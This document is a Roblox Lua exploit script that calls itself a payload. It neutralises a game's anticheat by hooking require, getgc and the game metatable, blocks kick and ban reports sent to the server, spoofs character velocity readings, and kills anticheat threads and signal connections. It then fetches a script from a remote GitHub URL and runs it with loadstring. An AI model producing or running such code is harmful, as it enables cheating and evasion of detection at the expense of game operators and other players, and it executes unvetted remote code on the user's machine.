local RS      = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local Run     = game:GetService("RunService")

-- poll; signal wait misses the event when we fire before the property exists
local LP = Players.LocalPlayer
local waited = 0
while not LP do
    task.wait(0.1)
    waited = waited + 0.1
    LP = Players.LocalPlayer
    if waited > 30 then
        warn("[payload] LocalPlayer never appeared after 30s")
        return
    end
end
print(string.format("[payload] LP ready after %.1fs: %s", waited, LP.Name))

local function waitForMainGame(timeout)
    local deadline = tick() + (timeout or 30)
    local needed = { "chickenfried", "Items", "SettingsModule", "roosterchickens", "SoundModule" }
    while tick() < deadline do
        local m = RS:FindFirstChild("Modules")
        if m then
            local all = true
            for _, n in ipairs(needed) do
                if not m:FindFirstChild(n) then all = false break end
            end
            if all then
                local SS = game:GetService("SoundService")
                if SS:FindFirstChild("Hit") and SS:FindFirstChild("HitHead") then
                    return m
                end
            end
        end
        task.wait(0.25)
    end
    return nil
end

local MODS = waitForMainGame(30)
if not MODS then
    warn("[payload] never saw main game modules, aborting")
    return
end

local _req = require

local function null(depth)
    depth = depth or 0
    if depth >= 3 then return nil end
    return setmetatable({}, {
        __index    = function() return null(depth + 1) end,
        __newindex = function() end,
        __call     = function() return null(depth + 1) end,
        __len      = function() return 0 end,
        __tostring = function() return "" end,
    })
end

local ac_names = { Kz = true, UoEx = true, uili = true, Cyz = true }

local function is_ac(m)
    if typeof(m) ~= "Instance" then return false end
    if not m:IsA("ModuleScript") then return false end
    if not ac_names[m.Name] then return false end
    return m:IsDescendantOf(MODS)
end

require = newcclosure(function(t, ...)
    local args = {...}
    if is_ac(t) then
        return null()
    end
    return _req(t, unpack(args))
end)

pcall(function() getrenv().require = require end)
if syn and syn.require then syn.require = require end

local _gc = getgc
local hidden = setmetatable({}, { __mode = "k" })

getgc = newcclosure(function(pass)
    local g = _gc(pass)
    if type(g) ~= "table" then return g end
    local out, n = {}, 0
    for i = 1, #g do
        local v = g[i]
        if not hidden[v] then n = n + 1; out[n] = v end
    end
    return out
end)

local mt      = getrawmetatable(game)
local old_nc  = mt.__namecall
local old_idx = mt.__index

local function from_ac()
    local tb = debug.traceback()
    if type(tb) ~= "string" then return false end
    return tb:find("Kz", 1, true) or tb:find("UoEx", 1, true)
        or tb:find("Cyz", 1, true) or tb:find("uili", 1, true)
        or tb:find("Luraph", 1, true)
end

local banned = {
    Kick = 1, Ban = 1, Report = 1, Flag = 1, Punish = 1,
    ClientKick = 1, ServerKick = 1, ac_report = 1,
    anticheat = 1, cheat_detected = 1,
}

local burst = {}
local function pace(key)
    local now = tick()
    local b = burst[key]
    if not b then b = {}; burst[key] = b end
    for i = #b, 1, -1 do
        if now - b[i] > 1.0 then table.remove(b, i) end
    end
    if #b >= 25 then return false end
    b[#b + 1] = now
    return true
end

setreadonly(mt, false)

mt.__namecall = newcclosure(function(self, ...)
    local m = getnamecallmethod()

    if (m == "Kick" or m == "Disconnect") and self == LP then
        return
    end

    if m == "FireServer" and typeof(self) == "Instance" then
        if banned[self.Name] and from_ac() then return end
        if from_ac() and not pace(self) then return end
    end

    return old_nc(self, ...)
end)

local cached_char = LP.Character
LP.CharacterAdded:Connect(function(c) cached_char = c end)
LP.CharacterRemoving:Connect(function() cached_char = nil end)
mt.__index = newcclosure(function(self, p)
    local v = old_idx(self, p)
    if self == cached_char and p == "AssemblyLinearVelocity" and typeof(v) == "Vector3" then
        if v.Magnitude > 100 then return v.Unit * 100 end
    end
    return v
end)

setreadonly(mt, true)

local function reap_threads()
    local ok, reg = pcall(getreg)
    if not ok or type(reg) ~= "table" then return end
    for _, v in pairs(reg) do
        if type(v) == "thread" and coroutine.status(v) == "suspended" then
            local ok2, tb = pcall(debug.traceback, v)
            if ok2 and type(tb) == "string" then
                if tb:find("UoEx", 1, true) or tb:find("Kz", 1, true)
                   or tb:find("Cyz", 1, true) then
                    pcall(coroutine.close, v)
                end
            end
        end
    end
end

local function reap_conns()
    local sigs = {
        Run.Heartbeat, Run.RenderStepped,
        Run.PreSimulation, Run.PostSimulation, Run.Stepped,
    }
    if LP then
        table.insert(sigs, LP.CharacterAdded)
        table.insert(sigs, LP.CharacterRemoving)
        table.insert(sigs, LP.Idled)
    end
    table.insert(sigs, Players.PlayerAdded)
    table.insert(sigs, Players.PlayerRemoving)

    for _, s in ipairs(sigs) do
        local ok, conns = pcall(getconnections, s)
        if ok and type(conns) == "table" then
            for _, c in ipairs(conns) do
                local fn = c.Function
                if fn then
                    local info = debug.getinfo(fn)
                    local src = tostring(info and info.source or ""):lower()
                    if src:find("uoex", 1, true) or src:find("kz", 1, true)
                       or src:find("cyz", 1, true) or src:find("luraph", 1, true) then
                        pcall(function() c:Disconnect() end)
                    end
                end
            end
        end
    end
end

task.spawn(function()
    while task.wait(0.35) do
        pcall(reap_threads)
        pcall(reap_conns)
    end
end)

-- correct URL: no .lua extension
local AQUA = "https://raw.githubusercontent.com/6nt0n/synapse.aqua/refs/heads/main/aqua"

-- aqua needs the character up before it loads
if not LP then
    warn("[payload] LP is nil at character wait, aborting")
    return
end
if not LP.Character then
    print("[payload] waiting for character")
    while not LP.Character do
        LP.CharacterAdded:Wait()
    end
end
task.wait(0.5)

local body_ok, body = pcall(game.HttpGet, game, AQUA, true)
if not body_ok or type(body) ~= "string" or #body < 500 then
    warn("[payload] aqua fetch failed or too small. len:", type(body) == "string" and #body or "n/a")
    return
end
print("[payload] aqua fetched, len:", #body)

local ok, err = xpcall(function()
    loadstring(body)()
end, function(e)
    return tostring(e) .. "\n" .. debug.traceback("", 2)
end)
if not ok then
    warn("aqua boot fail:\n" .. err)
end
